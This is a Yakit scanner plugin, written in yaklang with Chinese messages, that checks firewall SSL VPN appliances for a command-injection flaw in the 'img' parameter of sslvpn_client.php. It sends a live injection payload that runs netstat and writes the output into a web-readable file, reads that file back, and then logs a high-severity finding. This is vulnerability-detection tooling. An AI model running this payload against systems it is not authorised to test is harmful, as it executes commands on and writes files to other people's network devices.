# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60netstat%20-an%60%20|tee%20/usr/local/webui/sslvpn/test.txt|ls HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate
Connection: close
Cookie: USGSESSID=bc19e6124c4fffa0e38192bb3a64c250
Sec-Fetch-User: ?1
Accept-Language: zh-CN,zh;q=0.9r
Sec-Ch-Ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Cache-Control: max-age=0
Sec-Fetch-Dest: document
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1



`

packet2 = `GET /sslvpn/test.txt HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate
Connection: close
Cookie: USGSESSID=bc19e6124c4fffa0e38192bb3a64c250
Sec-Fetch-User: ?1
Accept-Language: zh-CN,zh;q=0.9r
Sec-Ch-Ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Cache-Control: max-age=0
Sec-Fetch-Dest: document
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1

`



    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if !poc.GetStatusCodeFromResponse(rsp) == 200{
		return
	}

	rsp1,req1,_ = poc.HTTP(packet2, 
		poc.params({"target":addr}),
		poc.https(isTls),
		poc.redirectTimes(0),
	)
	if poc.GetStatusCodeFromResponse(rsp1) == 200&&str.MatchAllOfSubString(rsp1,'LISTEN')&&str.MatchAllOfSubString(rsp1,"Active Internet connections")&&str.MatchAllOfSubString(rsp1,`0.0.0.0:*`){
    yakit.Info("%v存在多个防火墙产品RCE漏洞", addr)
    	risk.NewRisk(
    	addr,
        risk.title("多个防火墙产品RCE漏洞"),
        risk.severity("high"),
        risk.type("rce"),
        risk.titleVerbose("多个防火墙产品RCE漏洞"),
        risk.parameter(`img`),
        risk.payload('x /tmp|echo `netstat -an` |tee /usr/local/webui/sslvpn/test.txt|ls'),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.description("多个厂商安全产品存在命令执行漏洞，攻击者可通过此漏洞获取服务器权限。"),
        risk.solution("审查应用程序中的所有输入验证机制，确保使用白名单策略来限制命令执行的风险。"),
        risk.cve("no cve"),
    )
    } else {
         println("不存在多个防火墙产品RCE漏洞")
        }  
    return
    }  

 


handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
help: 多个厂商安全产品存在命令执行漏洞，攻击者可通过此漏洞获取服务器权限。
